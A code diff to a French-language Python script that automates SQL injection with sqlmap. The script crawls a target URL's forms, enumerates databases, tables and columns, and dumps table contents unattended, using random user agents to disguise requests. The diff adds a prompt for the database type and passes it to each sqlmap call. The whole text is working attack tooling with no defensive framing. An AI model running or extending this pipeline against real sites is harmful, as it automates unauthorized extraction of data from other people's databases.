@@ -34,13 +34,20 @@ if not crawl.isdigit() or int(crawl) < 1 or int(crawl) > 5:
     print("Niveau de profondeur invalide. Utilisation de la valeur par défaut (1).")
     crawl = 1
 
+dbms = input("Entrez le type de SGBD (ex: mysql, oracle, mssql) : ").strip()
+
+if not dbms:
+    print("Type de SGBD invalide. Utilisation de la valeur par défaut (mysql).")
+    dbms = "mysql"
+
+
 def run_sqlmap_commands(base_url):
     timestamp = datetime.now().strftime("%H:%M:%S /%Y-%m-%d/")
     try:
-        print(f"[+] Exécution : sqlmap -u {base_url} --random-agent --dbs --forms --crawl={crawl} --threads=5 --batch --answers=follow=y")
+        print(f"[+] Exécution : sqlmap --dbms={dbms} -u {base_url} --random-agent --dbs --forms --crawl={crawl} --threads=5 --batch --answers=follow=y")
         print(base_url)
         dbs_output = subprocess.check_output([
-            "sqlmap", "--level=5", "--random-agent", "-u", base_url,
+            "sqlmap",f"--dbms={dbms}", "--level=5", "--random-agent", "-u", base_url,
             "--dbs", "--forms", f"--crawl={crawl}", "--threads=5",
             "--batch", "--answers=follow=y"
         ]).decode()
@@ -63,7 +70,7 @@ def run_sqlmap_commands(base_url):
         print(f"[*] DB séléctionnée : {databases[position]}")
         print(f"[+] Exécution : sqlmap -u {base_url} --random-agent -D {db} --tables --forms --crawl={crawl} --threads=5 --batch --answers=follow=y")
         tables_output = subprocess.check_output([
-            "sqlmap", "--level=5", "--random-agent", "-u", base_url, "-D", db,
+            "sqlmap", f"--dbms={dbms}", "--level=5", "--random-agent", "-u", base_url, "-D", db,
             "--tables", "--forms", f"--crawl={crawl}", "--threads=5",
             "--batch", "--answers=follow=y"
         ]).decode()
@@ -81,7 +88,7 @@ def run_sqlmap_commands(base_url):
 
         try:
             columns_output = subprocess.check_output([
-                "sqlmap", "--level=5", "--random-agent", "-u", base_url, "-D", db, "-T", table,
+                "sqlmap", f"--dbms={dbms}", "--level=5", "--random-agent", "-u", base_url, "-D", db, "-T", table,
                 "--columns", "--forms", f"--crawl={crawl}", "--threads=5",
                 "--batch", "--answers=follow=y"
             ]).decode()
@@ -90,7 +97,7 @@ def run_sqlmap_commands(base_url):
             print(f"[+] Colonnes trouvées dans {table}")
             print(f"[+] Exécution : sqlmap -u {base_url} --random-agent -D {db} -T {table} --dump --forms --crawl={crawl} --threads=5 --batch --answers=follow=y")
             subprocess.run([
-                "sqlmap", "--level=5", "--random-agent", "-u", base_url, "-D", db, "-T", table,
+                "sqlmap", f"--dbms={dbms}", "--level=5", "--random-agent", "-u", base_url, "-D", db, "-T", table,
                 "--dump", "--forms", f"--crawl={crawl}", "--threads=5",
                 "--batch", "--answers=follow=y"
             ])
